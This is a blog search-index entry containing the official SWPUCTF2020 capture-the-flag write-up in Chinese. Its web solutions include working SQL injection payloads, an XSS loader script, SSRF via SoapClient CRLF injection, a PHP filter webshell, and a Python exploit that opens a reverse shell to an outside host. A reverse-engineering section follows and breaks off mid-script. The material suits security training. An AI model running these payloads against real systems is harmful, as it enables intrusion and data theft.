<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SWPUCTF2020 官方WP</title>
    <link href="/2020/12/09/SWPUCTF2020-%E5%AE%98%E6%96%B9WP/"/>
    <url>/2020/12/09/SWPUCTF2020-%E5%AE%98%E6%96%B9WP/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="359度防护网站"><a href="#359度防护网站" class="headerlink" title="359度防护网站"></a>359度防护网站</h2><h3 id="1-常规解"><a href="#1-常规解" class="headerlink" title="1.常规解"></a>1.常规解</h3><ol><li>网站目录下有常见遗留文件robots.txt 与 index.php.bak</li></ol><p><img src="https://uploader.shimo.im/f/mNgWNuGsO0C5TWh2.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/PuYLdw27kJZIyfsd.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>2.bak文件中是base64 解开后得到 important_index_its_so_long_right.php?id=1 页面</p><p><img src="https://uploader.shimo.im/f/JWAC04xrBNIIo3KB.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>3.在上面得到的页面中直接进行联合注入得到所有数据库名，表，字段及内容</p><ul><li>[<a href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA– -](<a href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA– -)</li></ul><p><img src="https://uploader.shimo.im/f/s0SEDhdn9LsruJx6.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><ul><li>分别查询LTLT库和h1nt库得到LTLT库中的login表，里面有pwd,usn，usn 是admin123,pwd是md5,在somd5查询得到 wllm@123</li><li>[<a href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(pwd) from login– -](<a href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(pwd) from login– -)</li></ul><p><img src="https://uploader.shimo.im/f/g6R2P7KinrnVTjco.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><ul><li>h1nt库中是help表，里面有hint，内容是一个页面名，访问后提示先登录，但是并没有给登录地址，所用会话也不是与 administrator.html 相同，所以这条路先暂停</li><li>[<a href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(hint) from h1nt.help– -](<a href="http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;">http://182.150.46.187:8802/important_index_its_so_long_right.php?id=1&#39;</a> and 1=2 union select 1,2,3,group_concat(hint) from h1nt.help– -)</li></ul><p><img src="https://uploader.shimo.im/f/TQmhpOesRlwRsEo7.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/0mIbhjOlPnfAfpag.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><ul><li>利用得到的 usn和pwd登录进入robots.txt中的 administrator.html</li></ul><p><img src="https://uploader.shimo.im/f/2B03P4zqzX6RnmUq.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><ul><li>进去后是一个后台，翻看页面后发现无明显可利用点，查看源码发现憨憨开发注释掉的部分</li></ul><p><img src="https://uploader.shimo.im/f/3PY8np9P7bRDRuIR.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/6sKyTB8ZX1SLwZQF.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><ul><li>访问 writeuser_00001_log.log 后得到一页的base64，丢burp解码，找到可疑页面 up_lo_ad_ad_min.php</li></ul><p><img src="https://uploader.shimo.im/f/UcCJEOrAEBTOtCbK.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><ul><li>访问发现要登录，但是只有一条信息需要验证，F12发现有输入长度限制为5，猜测是前面log页面中的user:00001</li></ul><p><img src="https://uploader.shimo.im/f/2x1MFSXYHW1YtGFg.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/CH2HoV512vHbdVGk.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/FuX1MfweX6W7PDLZ.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><ul><li>登录成功后发现是一个文件上传点,很多师傅在这里上传了很久都没成功，其实在现在的开发中，只要合理运用白名单，基本就能防死文件上传，这里文件上传的后端验证就是白名单，只能上传jpg,png,gif，所以理论上无法传马</li></ul><p><img src="https://uploader.shimo.im/f/2Lj9BdBvDenYUDMx.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><ul><li>先上传一个正常图片，得到如下信息</li></ul><p><img src="https://uploader.shimo.im/f/e1WiP8ADMnLzlzSL.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><ul><li>之前在h1nt库中拿到的 last_index_come_on_swpu_ctf.php?id=4 页面现在发现可以进去了，这个页面的登录验证就是用的密码是00001的那个页面，进去后发现可以直接sql注入</li><li>getshell的常规方法中，利用sql语句的into  outfile并不算罕见，只是由于很多情况下secure_file_priv并未设置，导致无法进行这类文件读写，但是这在渗透中仍然不应该是被忘记的一种方法，没有尝试就不能凭经验否定这种方法。我们尝试写入一句话，但是考虑到目录可能没有可写权限，我们需要找到一个确定有可写权限的文件夹，很容易联想到上传页面暴漏的文件夹就有可写权限，于是构造语句写入一句话</li></ul><p><img src="https://uploader.shimo.im/f/mNQnyuHQPrPE5mBX.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/n0gGRcfDFyYg0Pr5.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><ul><li>利用木马文件进行命令执行system(‘cat /flag’);即可获得flag</li></ul><p><img src="https://uploader.shimo.im/f/Z54hDTIq7Hd4GG0D.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/M3gn6mgsHFGCeUFJ.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><h3 id="2-非预期"><a href="#2-非预期" class="headerlink" title="2.非预期"></a>2.非预期</h3><ul><li>出题时本意是在前台页面用WAF防死SQL注入，但是由于WAF版本未及时更新，有少数师傅用load_file将文件暴力读取了,类似这种</li></ul><p><img src="https://uploader.shimo.im/f/Z16ge7NNThjWcN8y.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><h2 id="sqlsqlsql"><a href="#sqlsqlsql" class="headerlink" title="sqlsqlsql"></a>sqlsqlsql</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>此题参考了第三届CBCTF的sql-labs</p><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>自己测试可以发现如下过滤</p><p><img src="https://uploader.shimo.im/f/xeM5wxMY44vQQBES.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/iLUlosx7Xaanl1RY.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>users表字段 id name emile salary</p><p>flllag表字段 id asuazttaz</p><p>查看源码可以获得提示</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- select * from users where id = &#x27;$id&#x27;--&gt;</span></code></pre><p>这个提示是想说明要闭合id字段的引号<br>结合页面的英文提示，很容易想到这个题是时间盲注</p><h4 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h4><ol><li>用异或来闭合引号</li><li>case when then else end来替代if</li><li>用join多个大表造成延时</li><li>通过mysql5.7的sys.schema_table_statistics_with_buffer表查询表名</li><li>通过无列名注入获取字段内容</li><li>通过括号，或者引号包裹来代替空格</li><li>flllag表有两个字段且flag值在第二个字段</li><li>通过like或者regexp来匹配结果（但是这里不能用like，师傅们结合flag内容具体想想，卖个关子）</li></ol><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>两秒左右的延时</p><p>查表名</p><pre><code class="hljs plain">http:&#x2F;&#x2F;182.150.46.187:8801&#x2F;ttttt&#x2F;?id&#x3D;1&#39;^(select(case&#39;1&#39;when((select(select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema&#x3D;database()))regexp&quot;flllag&quot;))then&#39;1&#39;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end))^&#39;1</code></pre><p>查字段内容</p><pre><code class="hljs plain">http:&#x2F;&#x2F;182.150.46.187:8801&#x2F;ttttt&#x2F;?id&#x3D;1&#39;^(select(case&#39;1&#39;when((select(select(group_concat(&#96;2&#96;))from(select*from(select(1))as&#96;a&#96;join(select(2))as&#96;b&#96;union(select*from(flllag)))as&#96;a&#96;)regexp&quot;flag&#123;aaa&quot;))then&#39;1&#39;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end))^&#39;1</code></pre><p>脚本就不给了，因为这个题是0解，师傅们看payload自己重新做吧<br>题目环境会开放几天的</p><p>flag{blind_1nj3ct10n_1s_very_s1mpl3}</p><h2 id="太极"><a href="#太极" class="headerlink" title="太极"></a>太极</h2><p>简单测试发现注册处存在无过滤xss漏洞，注册时插入payload</p><p>用户名：<script src=[https://xxx](https://xxxxxxx).xss.ht></script>  密码随意</p><p>管理员会定期刷新页面，但是由于设置了httponly，不能直接获取cookie</p><p>可以看到：</p><p><img src="https://uploader.shimo.im/f/8pUCSFkixan0K5tp.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/MTSoi5D81fKG94QZ.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>当我们直接访问这个ssrf_for_test.php时提示“权限不足”，但我们可以借助管理员的身份来触发这个ssrf，即是通过xss+csrf发起一个ssrf请求，提示也告诉flag在redis的flag字段，我们只要抓一下这个数据包，构造出这个过程，然后去接收返回结果就行。(网上已有很多资料，ssrf打redis等等)</p><p><img src="https://uploader.shimo.im/f/jmlVlGtoGbTnYZVq.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>注册用户  &lt;script src=”<a href="http://xxxxxxxxx/getflag.js">http://xxxxxxxxx/getflag.js</a>&gt;</script></p><p>监听一哈 python3 -m http.server   9999</p><p>上个厕所回来就看到flag</p><h2 id="noobpy"><a href="#noobpy" class="headerlink" title="noobpy"></a><strong>noobpy</strong></h2><p>发现</p><p><img src="https://uploader.shimo.im/f/auXxNzdS46ayFlp9.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>内存在命令注入</p><p>或者尝试报错也能发现。</p><p><img src="https://uploader.shimo.im/f/vQbvBUnrGvKjX2Pe.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>将request的[]重载为exec实现命令执行，并且用UA头来注入</p><p>反弹shell拿到flag</p><p>Exp:</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests url =<span class="hljs-string">&quot;http://192.168.31.51:6061/Equ.php&quot;</span> s= requests.Session() <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">poc1,poc2</span>):</span>    data = &#123;        <span class="hljs-string">&quot;left&quot;</span>:poc1+<span class="hljs-string">&quot;1&quot;</span>,        <span class="hljs-string">&quot;right&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>    &#125;    header = &#123;        <span class="hljs-string">&quot;User-Agent&quot;</span>:poc2    &#125;    req = s.post(url,data=data,headers=header)    <span class="hljs-keyword">print</span> req.text<span class="hljs-comment">#exp(&#x27;__builtins__.eval=__builtins__.exec#&#x27;,&quot;xxx&quot;)</span>exp(<span class="hljs-string">&quot;request.__class__.__getitem__=__builtins__.exec;request[request.user_agent.string];&quot;</span>,<span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.91.1&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span>)</code></pre><h2 id="原谅最光荣"><a href="#原谅最光荣" class="headerlink" title="原谅最光荣"></a>原谅最光荣</h2><p>ps: 来自真实环境，稍微增加了一点CTF特色</p><p>1.打开题目链接，点开页面上的几个链接发现路由是xxx.action会以为是java，扫描或者是常识访问到robots.txt</p><p><img src="https://uploader.shimo.im/f/r0kDMSbQPPgyk4nU.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>可以看到是php的，题目提到包容二字以及从这几个路径可以推断该题目是伪静态+文件包含，至于是本地还是远程需要进一步验证：</p><p>访问：/.%2f.%2f.%2fpricing.action，返回对应pricing.action页面，说明可以拼接路径，但是测试无法跳转，尝试包含/etc/passwd、日志、/proc/self/也无结果，这时可以尝试远程文件包含：</p><p>访问：<code>/http:%2f%2fwww.baidu.com.action</code>，截图如下：</p><p><img src="https://uploader.shimo.im/f/7eUYc2DS1GX4y96Z.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>结果触发了规则，注意看http:/www 中间少了个斜线，然后看代码，发现对path进行了url解码，所以可以在传入路径时使用<code>http:%252f%2fwww.baidu.com</code>来绕过这个问题。</p><p>继续看代码，下面对path开头的几个字符做了检测，这里被检测的字符串数组内容未知。由于php能用的伪协议就那么几种，挨个测试即可。</p><p>最后发现可以用php://filter包含本地文件获得源码：</p><p><a href="view-source:http://47.116.79.40:32773/php:%252f%252ffilter/convert.base64-encode/resource=contact.action">http://47.116.79.40:32773/php:%252f%252ffilter/convert.base64-encode/resource=contact.action</a></p><p><img src="https://uploader.shimo.im/f/RYmhEtnwA5kudmQ8.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>但是这里是无法通过这个来读取到flag的，因为前面测试可以知道该网站代码会对path添加一个文件后缀然后包含，所以这个题应该是需要获取webshell才能拿到flag。</p><p>这里我们可以用resource=<a href="http://xxx.xxx.com/xxx">http://xxx.xxx.com/xxx</a>来包含远程文档，但是测试可知无法包含外网资源，只能包含localhost（注意末尾加%23来绕过文件后缀）：</p><p><a href="http://47.116.79.40:32773/php:%252f%252ffilter%2fconvert.base64-encode%2fresource=http:%252f%252f127.0.0.1/%23.action">http://47.116.79.40:32773/php:%252f%252ffilter%2fconvert.base64-encode%2fresource=http:%252f%252f127.0.0.1/%23.action</a></p><p><img src="https://uploader.shimo.im/f/NktMC069HaYgMx6t.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>（这样是没有问题的）</p><p>然后在页面可以找到一个contact.action存在一个GET型表单，提交的值可以在输出中打印出来，但是值被实体化了（无法在页面显示出&lt;&gt;等符号）。</p><p><img src="https://uploader.shimo.im/f/3cTaUesE82gdpcoy.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>这里的思路是通过base64-decode来将我们传入的base64字符串解成&lt;?php的代码，从而绕过htlm实体化编码，但是convert.base64-decode这个过滤器相对base64-decode函数来说比较古怪，在字符中间遇到等号会直接报错。</p><p>这里去除等号的方法可能不唯一，我选择使用简单的utf-7编码，编码规则可以自行查看wiki，大体上是字母数字和个别符号属于直接编码，也就是直接输出；而等号属于可选的直接编码字符，一般会进行base64然后成为这种：-Iwo+。最后payload为：</p><p><a href="http://47.116.79.40:32773/php%3A%252F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%2Fconvert.base64-decode%2fresource%3Dhttp:%252f/localhost/contact.action%3fname=xxPD9waHAgZXZhbCgkX0dFVFsxMjNdKTs%252fPg%23.action?123=echo+%22%3Ch1%3Epwned!!!%3C/h1%3E%22;">http://47.116.79.40:32773/php%3A%252F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%2Fconvert.base64-decode%2fresource%3Dhttp:%252f/localhost/contact.action%3fname=xxPD9waHAgZXZhbCgkX0dFVFsxMjNdKTs%252fPg%23.action?123=echo+%22%3Ch1%3Epwned!!!%3C/h1%3E%22;</a></p><p>格式化一下：<a href="http://47.116.79.40:32773/php://filter/convert.iconv.utf-8.utf-7/convert.base64-decode/resource=http://localhost/contact.action?name=xxPD9waHAgZXZhbCgkX0dFVFsxMjNdKTs/Pg#.action?123=echo+&quot;">http://47.116.79.40:32773/php://filter/convert.iconv.utf-8.utf-7/convert.base64-decode/resource=http://localhost/contact.action?name=xxPD9waHAgZXZhbCgkX0dFVFsxMjNdKTs/Pg#.action?123=echo+&quot;</a><h1>pwned!!!</h1>“;</p><p>访问结果：</p><p><img src="https://uploader.shimo.im/f/wsOp6ZcyQaigYOW0.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>值得注意的是，经过base64编码payload的偏移量必须为4的整数倍，因为base64解码是以4字节一组进行转换。</p><p>拿到shell后，flag.txt在根目录可以看到。</p><h1 id="重来"><a href="#重来" class="headerlink" title="重来"></a>重来</h1><p>访问网站，是个登陆</p><p><img src="https://uploader.shimo.im/f/SyslTmLrOKUiV7qO.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>登陆处发现login.js</p><p><a href="mailto:&#x74;&#x65;&#115;&#x74;&#x40;&#113;&#x71;&#46;&#x63;&#111;&#x6d;">&#x74;&#x65;&#115;&#x74;&#x40;&#113;&#x71;&#46;&#x63;&#111;&#x6d;</a> test登录</p><p><img src="https://uploader.shimo.im/f/DQAKRGTWoxXXTZI5.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>更改user为admin，访问，越权成功</p><p><a href="http://192.144.157.29:8080/a.php?classname=index&param2=admin">http://xxxx.xxx.xxx.xx/a.php?classname=index&amp;param2=admin</a></p><p>发现地址发生了变化并且多了一个隐藏的表单</p><p><img src="https://uploader.shimo.im/f/bRjMeqFrp32UYLhe.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>提交id=1</p><p><img src="https://uploader.shimo.im/f/3fKD7v5d8Q4im5Zi.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>提示要127.0.0.1，那就是需要ssrf了，观察登陆时的url</p><p><a href="http://192.144.157.29:8080/a.php?classname=login&param2=1">http://192.144.157.29:8080/a.php?classname=login&amp;param2=1</a></p><p>classname是一个类名字，param2是这个类的第2个参数，这里存在一个任意对象实列化漏洞，输入一个不存在的类</p><p><img src="https://uploader.shimo.im/f/N5m77uXBTPKNKXzh.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>输入php的内置类Exception</p><p><img src="https://uploader.shimo.im/f/cmmkvmvtKbfliW1a.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>内置类SimpleXMLElement</p><p><img src="https://uploader.shimo.im/f/CJhHWjX8uHheYJQA.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>2者都报第二个参数错误，应该是第一个参数被固定了，结合ssrf，想到了内置类soapClient,验证</p><p><a href="http://192.144.157.29:8080/a.php?classname=soapclient&param2%5Blocation%5D=http://132.232.75.90:8080/&param2%5Buri%5D=1231">http://xxxxxxx/a.php?classname=soapclient&amp;param2[location]=http://vps/&amp;param2[uri]=1231</a></p><p><img src="https://uploader.shimo.im/f/RtanIUbcbpv7DIMc.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>但soapclient只能传递get参数，post为自己生成的xml数据，不可控，但soapclient可以自己配置部分请求头如user_agent，并且存在CRLF问题，比如</p><p><img src="https://uploader.shimo.im/f/dgoU7Y2sIGnpE0I0.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>构造一个post请求,注意带上cookie</p><pre><code class="hljs plain">http:&#x2F;&#x2F;xxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%26a&#x3D;&amp;param2[uri]&#x3D;123</code></pre><p><img src="https://uploader.shimo.im/f/s3YJTHnLxtD7w7gi.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>更改vps为127.0.0.1，仍然没有flag</p><p><img src="https://uploader.shimo.im/f/0TcaGmGOkB7lW4vC.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>id参数可能是个注入，尝试注入payload</p><p><img src="https://uploader.shimo.im/f/OiIFWg61E4onnpuL.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>存在注入，注入脚本</p><pre><code class="hljs plain">import requests#url_template&#x3D;&quot;http:&#x2F;&#x2F;xxxxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%27%20and ascii(substr(database(),&#123;&#125;,1))&#x3D;&#123;&#125;%23%26a&#x3D;&amp;param2[uri]&#x3D;123&quot;#数据库名user#url_template&#x3D;&quot;http:&#x2F;&#x2F;xxxxxxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%27%20and ascii(substr((SELECT group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;0x75736572),&#123;&#125;,1))&#x3D;&#123;&#125;%23%26a&#x3D;&amp;param2[uri]&#x3D;123&quot;#表名flag#url_template&#x3D;&quot;http:&#x2F;&#x2F;xxxxxxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%27%20and ascii(substr((SELECT group_concat(column_name) FROM information_schema.columns where table_name&#x3D;0x666c6167 ),&#123;&#125;,1))&#x3D;&#123;&#125;%23%26a&#x3D;&amp;param2[uri]&#x3D;123&quot;#字段名flaaaggggurl_template&#x3D;&quot;http:&#x2F;&#x2F;xxxxx&#x2F;a.php?classname&#x3D;soapclient&amp;param2[location]&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;new_adminuser.php&amp;param2[user_agent]&#x3D;aa%0d%0aCookie:%20isadmin&#x3D;1;flag&#x3D;1%0d%0aContent-Type:%20application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:%20367%0d%0a%0d%0aid&#x3D;1%27%20and ascii(substr((select group_concat(flaaagggg) from flag),&#123;&#125;,1))&#x3D;&#123;&#125;%23%26a&#x3D;&amp;param2[uri]&#x3D;123&quot;​#payloads&#x3D;&#39;abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ\,_\&#123;\&#125;&#39;payloads &#x3D; &#39;abcdefghigklmnopqrstuvwxyz,\&#123;\&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!#$%^&amp;*()-+@_.&#39;​database_name&#x3D;&#39;&#39;for j in range(1,50):    for i in payloads:        i_ascii&#x3D;ord(i)        url&#x3D;url_template.format(j,i_ascii)        result&#x3D;requests.get(url)        length&#x3D;len(result.text)        if length&gt;300:            database_name+&#x3D;i            print(database_name)            break</code></pre><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="RealEzRE"><a href="#RealEzRE" class="headerlink" title="RealEzRE"></a>RealEzRE</h2><h3 id="1-SMC"><a href="#1-SMC" class="headerlink" title="1. SMC"></a>1. SMC</h3><p>进入主函数后发现几个被加密后的字符串，通过IDA的Findcrypt 插件发现Base64的表，猜测这些字符串是经过Base64编码的，解密后得知是这里是一些提示信息</p><p><img src="https://uploader.shimo.im/f/pviYQEuT7nuD5Ce5.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>下面的操作是对关键函数区块进行smc解密操作，首先通过sub_401B80函数找到要解密的区块始末地址和大小</p><p><img src="https://uploader.shimo.im/f/HNq1zt20TYye2PVz.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>目标区块和0x67异或解密</p><p><img src="https://uploader.shimo.im/f/a7x2sM1wuH3xwmd9.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/0oCOXWt6j0BB8Z2b.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>IDC 脚本</p><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> key = <span class="hljs-number">0x67</span>;<span class="hljs-keyword">auto</span> from = <span class="hljs-number">0x401cc0</span> + <span class="hljs-number">0x20</span>;<span class="hljs-keyword">auto</span> <span class="hljs-built_in">size</span> = <span class="hljs-number">0x359</span>;<span class="hljs-keyword">auto</span> i, x; <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">size</span>; ++i ) &#123;     x = Byte(from);     x = (x^(key + (i &amp; <span class="hljs-number">0xF</span>)));     PatchByte(from,x);     from = from + <span class="hljs-number">1</span>;&#125; Message(<span class="hljs-string">&quot;\n Success \n&quot;</span>);​</code></pre><h3 id="2-关键函数"><a href="#2-关键函数" class="headerlink" title="2. 关键函数"></a>2. 关键函数</h3><p>通过一些操作还原了关键函数，查看伪C代码后发现输入的字符串加密后和特定数值分三次比较</p><p><img src="https://uploader.shimo.im/f/MhehI1X8DJXKISOV.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><h3 id="3-加密函数"><a href="#3-加密函数" class="headerlink" title="3. 加密函数"></a>3. 加密函数</h3><p><img src="https://uploader.shimo.im/f/Pvyfe6IrtHAzpBth.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>通过分析知道这是个RC4加密</p><p><img src="https://uploader.shimo.im/f/ZggJEJUbk518mbCM.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>解密脚本</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>​<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rc4</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-keyword">int</span> x, y, m[<span class="hljs-number">256</span>];&#125;;​<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>     uint8;​<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    uint8 flag[<span class="hljs-number">100</span>] = &#123; <span class="hljs-number">0</span> &#125;;    uint8 cmp[] = &#123; <span class="hljs-number">0x12</span>,<span class="hljs-number">0xa7</span>,<span class="hljs-number">0xf5</span>,<span class="hljs-number">0xde</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0xe6</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0xbf</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x98</span>,<span class="hljs-number">0xfe</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0xdd</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0xb6</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x2d</span>,<span 